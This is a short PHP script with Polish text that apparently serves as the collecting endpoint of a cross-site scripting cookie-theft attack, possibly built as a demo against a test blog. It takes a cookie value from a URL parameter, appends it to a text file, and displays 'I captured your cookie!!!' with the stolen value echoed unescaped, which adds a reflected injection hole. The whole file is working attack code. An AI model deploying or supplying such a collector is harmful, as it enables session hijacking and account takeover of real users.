<?php
$ciastko = "\n".$_GET['ciastko'];
$uchwyt = fopen ('ciasteczko.txt', "a");
fwrite($uchwyt, $ciastko);
fclose($uchwyt);

echo " <b><centre><h3>Przechwyciłem twoje ciasteczko!!!</h3></b><h3>$ciastko</h3></centre><br/>

<a href='/blog_php/index.php?post_cat=2','_self'>Wróć do strony poprzedniej</a>
   ";
?>
